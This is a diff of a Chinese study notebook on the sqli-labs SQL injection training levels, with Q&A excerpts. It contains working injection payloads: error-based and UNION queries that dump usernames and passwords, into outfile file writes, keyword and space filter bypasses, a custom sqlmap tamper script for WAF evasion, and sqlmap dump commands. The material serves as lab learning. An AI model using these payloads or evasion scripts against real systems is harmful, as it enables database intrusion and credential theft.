@@ -1,25 +1,8 @@
-#### **第五关的疑问：**
-
-第五关是布尔盲注，但是布尔盲注的payload肯定符合语法，只是说通过语法内容的正确与否来（是否回显固定内容），来获取信息。但是如果使用错误语法的payload。就会有回显
-
-
-```
-?id=1' union Select 1,count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a--+
-# 显示数据库名
-```
-
-```
-?id=1' union select 1,count(*),updatexml(1,concat(0x3a,(select group_concat(column_name) from information_schema.schemata),0x3a),1)a from information_schema.columns group by a--+
-# 报错：Only constant XPATH queries are supported（仅支持常量 XPATH 查询）
-```
+## 笔记
 
 
 
-
-
-
-
-#### **第七关的疑问：**
+#### **第七关**
 
 ```
 ?id=1'))UNION SELECT 1,2,3 into outfile "D:\\uuu.txt"--+
@@ -41,13 +24,26 @@
 
 最后重复刚才的sql语句`show variables like '%secure%';` 来查看是否修改成功：发现已经出现路径了。
 
-那这个时候，我们就可以执行`outfile`来输出文件到F盘的任意位置了。
+那这个时候，我们就可以执行`outfile`来输出文件到 D盘的任意位置了。
 
 ```
 my.ini文件是MySQL数据库服务器和客户端程序的配置文件，它可以用于设置MySQL的基本运行参数、安全性、缓存、日志记录等方面的参数。
 ```
 
-
+> 在sql漏洞中可以使用file系列函数
+>
+> load_file()  ：读取指定文件
+> into outfile ：将查询的数据写入文件中
+> into dumpfile：将查询的数据写入文件中(只能写入一行数据)
+>
+> ```
+> secure_file_prive=null //限制mysqld 不允许导入导出
+> secure_file_priv=/path/  //限制mysqld的导入导出只能发生在默认的/path/目录下
+> secure_file_priv=’’  //不对mysqld 的导入 导出做限制
+> ```
+>
+> outfile函数可以导出多行，而dumpfile只能导出一行数据
+> outfile函数在将数据写到文件里时有特殊的格式转换，而dumpfile则保持原数据格式
 
 这时候我们可以通过`?id=-1')) union select version(),database(),user() into outfile "D:\\uuu.txt" --+`来使得所需信息输出到uuu.txt
 
@@ -71,11 +67,188 @@ my.ini文件是MySQL数据库服务器和客户端程序的配置文件，它可
 
 
 
+#### 第二十三关
+
+第二十三关重新回到get请求，会发现输入单引号报错，但是注释符不管用。猜测注释符被过滤，看来源码果然被注释了，所以我们可以用单引号闭合，发现成功。之后可以使用联合注入。不过在判断列数时候不能使用order by 去判断需要用?id=-1' union select 1,2,3,4 or '1'='1通过不停加数字判断最后根据页面显示是三列，且显示位是2号。
+
+```
+?id=1' or '1'='1
+
+这样sql语句就变成 id='1' or '1'='1'
+
+
+?id=-1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 or '1'='1
+
+?id=-1' union select 1,(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users' ),3 or '1'='1
+
+?id=-1' union select 1,(select group_concat(password,username) from users),3 or '1'='1
+```
+
+
+
+
+
+
+
+#### 第二十五关
+
+**本关主要为 or and 过滤，如何绕过 or 和 and 过滤。**
+
+> 根据提示是将or和and这两个替换成空，但是只替换一次。大小写绕过没有用。我们可以采用双写绕过。本次关卡使用联合注入就可以了，information里面涉及or可以写成infoorrmation。
+
+一般性提供以下几种思路： 
+
+（1）大小写变形 Or,OR,oR 
+
+（2）编码，hex，urlencode 
+
+（3）添加注释/*or*/ 
+
+（4）利用符号 and=&& or=||
+
+
+
+
+
+
+
+#### 第二十五关
+
+***Q：sqlmap中将`and`替换为`&&`，需要使用哪一个--tamper 绕过WAF脚本***
+
+***A：***在SQLMap中，可以使用`--tamper`选项来使用特定的绕过WAF脚本。如果你想将`AND`替换为`&&`，你可以使用内置的`tamper`脚本`charencode`。
+
+这将使用`charencode`脚本来编码请求中的字符，包括将`AND`替换为`&&`。
+
+
+
+***Q：我不需要编码请求中的字符，只需要包括将AND替换为&&***
+
+***A：***如果你只想简单地将`AND`替换为`&&`，而不进行其他字符编码或转换，你可以使用自定义的绕过脚本。以下是一个简单的绕过脚本示例，它将替换查询中的`AND`为`&&`：
+
+```python
+def tamper(payload, **kwargs):
+    payload = payload.replace("AND", "&&")
+    payload = payload.replace("OR", "||")
+    return payload
+```
+
+将上述代码保存为`and_to_double_amp.py`（或任何你喜欢的名称），然后在SQLMap中使用`--tamper`选项指定该脚本的路径：
+
+```
+sqlmap -u <目标URL> --tamper and_to_double_amp.py
+```
+
+这将应用自定义的绕过脚本，将`AND`替换为`&&`。
+
+
+
+
+
+
+
+#### 第二十六关
+
+注释符以及空格给过滤了
+
+我们需要使用单引号进行闭合，双写绕过逻辑运算符或者使用`&&`和`||`替换。空格绕过网上找了些资料，对于绕过空格限制有大把的方式对于空格，有较多的方法：
+
+```
+%09 TAB键（水平）
+%0a 新建一行
+%0c 新的一页
+%0d return功能
+%0b TAB键（垂直）
+%a0 空格
+```
+
+我在windows和kali里面都用不了，可能是因为apache解析不了。只能使用()绕过。报错注入空格使用比较少所以我们可以使用报错注入。
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+## 疑问
+
+
+
+#### **第五关的疑问：**
+
+第五关是布尔盲注，但是布尔盲注的payload肯定符合语法，只是说通过语法内容的正确与否来（是否回显固定内容），来获取信息。但是有时候如果使用错误语法的payload，也有回显。
+
+
+```
+?id=1' union Select 1,count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a--+
+# 显示数据库名
+```
+
+```
+?id=1' union select 1,count(*),updatexml(1,concat(0x3a,(select group_concat(column_name) from information_schema.schemata),0x3a),1)a from information_schema.columns group by a--+
+# 报错：Only constant XPATH queries are supported（仅支持常量 XPATH 查询）
+```
+
+
+
+
+
+
+
 #### **第十七关的疑问：**
 
-这一关用的使增删改部分，建议看看 SQL注入天书 和后端代码
+这一关用的使增删改部分，建议看看 *SQL 注入天书* 和后端代码
 
+**源码：**
 
+```php
+<?php
+function check_input($value) // 检查输入的账户名
+{
+    if (!empty($value)) // 如果账户名不为空则进行以下判断
+    {
+        // truncation (see comments)
+        $value = substr($value, 0, 15); // 截取账户名前15的字符
+    }
+
+    // Stripslashes if magic quotes enabled
+    if (get_magic_quotes_gpc()) // 该函数是都是on也就是打开，打开则进入一下判断
+    // 该函数的作用是给（' " / null）特殊字符加上反斜杠转义
+    //默认地，PHP 对所有的 GET、POST 和 COOKIE 数据自动运行 addslashes()，（PS:也是这作用）
+    {
+        $value = stripslashes($value); // 删除反斜杠
+    }
+
+    // Quote if not a number
+    if (!ctype_digit($value)) // uname字符串如果是非数字，则将其中的特殊字符转义
+    {
+        $value = "'" . mysql_real_escape_string($value) . "'"; // 函数转义 SQL 语句中使用的字符串中的特殊字符。
+    } else //如果是数字
+    {
+        $value = intval($value); // 变成整数
+    }
+    return $value;
+}
+?>
+```
 
 ==第一个疑问：==
 
@@ -89,13 +262,13 @@ my.ini文件是MySQL数据库服务器和客户端程序的配置文件，它可
 
 > ***Q：为什么错误***
 >
-> **A：**在你的 SQL 注入语句中，使用子查询时，每个派生表都必须有一个别名。在你的第二个语句中，你去掉了`b`，但是由于缺少别名，导致了错误。
+> ***A：***在你的 SQL 注入语句中，使用子查询时，每个派生表都必须有一个别名。在你的第二个语句中，你去掉了`b`，但是由于缺少别名，导致了错误。
 >
 > 
 >
 > ***Q：请详细解释为什么使用子查询时，每个派生表都必须有一个别名。***
 >
-> **A：**在 SQL 查询中，派生表是在查询的 FROM 子句中使用的子查询。当你在 SQL 查询中使用子查询时，派生表（即子查询）实际上是一个临时的表，它会在查询执行时生成，并被引用于主查询中。
+> ***A：***在 SQL 查询中，派生表是在查询的 FROM 子句中使用的子查询。当你在 SQL 查询中使用子查询时，派生表（即子查询）实际上是一个临时的表，它会在查询执行时生成，并被引用于主查询中。
 >
 > 给派生表一个别名的原因有几个：
 >
@@ -120,9 +293,9 @@ my.ini文件是MySQL数据库服务器和客户端程序的配置文件，它可
 >
 > 
 >
-> ***A：那为什么 ?id=-1') union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--+不需要设置别名***
+> ***Q：那为什么 ?id=-1') union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--+不需要设置别名***
 >
-> **Q：**在你提供的 SQL 注入语句中，是利用了 UNION 操作符，而不是子查询。在 UNION 操作符中，不需要为每个 SELECT 子句设置别名的主要原因是，UNION 的目标是合并多个查询的结果集，而不是创建派生表。在 UNION 中，结果集的列名是由第一个 SELECT 语句定义的，后续的 SELECT 语句的列名必须与第一个 SELECT 语句的列名相匹配。
+> ***A：***在你提供的 SQL 注入语句中，是利用了 UNION 操作符，而不是子查询。在 UNION 操作符中，不需要为每个 SELECT 子句设置别名的主要原因是，UNION 的目标是合并多个查询的结果集，而不是创建派生表。在 UNION 中，结果集的列名是由第一个 SELECT 语句定义的，后续的 SELECT 语句的列名必须与第一个 SELECT 语句的列名相匹配。
 >
 > 具体来说，你的注入语句是这样的：
 >
@@ -143,9 +316,9 @@ my.ini文件是MySQL数据库服务器和客户端程序的配置文件，它可
 >
 > 
 >
-> ***A：使用 and or 等就是子查询吗***
+> ***Q：解释子查询语句***
 >
-> **Q：**不，使用 `AND`、`OR` 等逻辑运算符并不等同于子查询。这些逻辑运算符是用于连接不同的条件，而子查询是一个嵌套在主查询中的查询语句。
+> ***A：***子查询是一个嵌套在主查询中的查询语句。
 >
 > 子查询是在主查询中嵌套的查询语句，可以返回一个结果集，然后主查询可以使用这个结果集进行进一步的过滤、比较或操作。子查询通常出现在 `SELECT`、`FROM`、`WHERE` 等子句中。
 >
@@ -215,13 +388,11 @@ my.ini文件是MySQL数据库服务器和客户端程序的配置文件，它可
 
 
 
-==第三个疑问：==
+同样，使用sqlmap：`python3 sqlmap.py -r "D:\post.txt" -D security -T users --columns --dump`
 
-使用sqlmap：`python3 sqlmap.py -r "D:\post.txt" -D security -T users --columns --dump`
+并不能成功跑出数据来，因为这儿我们跑的时候会直接给替换掉，也就是说跑出来的并不是原数据库的密码，而是替换之后的密码（后端代码本来就是先 `select` 匹配账户，然后 `updata` 修改密码）。
 
-并不能成功跑出数据来，因为这儿我们跑的时候会直接给替换掉，也就是说跑出来的并不是原数据库的密码，而是替换之后的密码（后端代码本来就是先 select 匹配账户，然后 updata 修改密码）。
-
-（你可以边让 sqlmap 跑，边刷新Navicat，瞅瞅数据库都遭遇了什么折磨……哎……真的是……哎）
+（你可以边让 sqlmap 跑，边刷新`Navicat`，瞅瞅数据库都遭遇了什么折磨……哎……真的是……哎）
 
 复原的方法就是重置一下 sqli-labs 数据库
 
@@ -249,3 +420,6 @@ Sec-Fetch-User: ?1
 
 uname=admin&passwd=asd*&submit=Submit
 ```
+
+
+
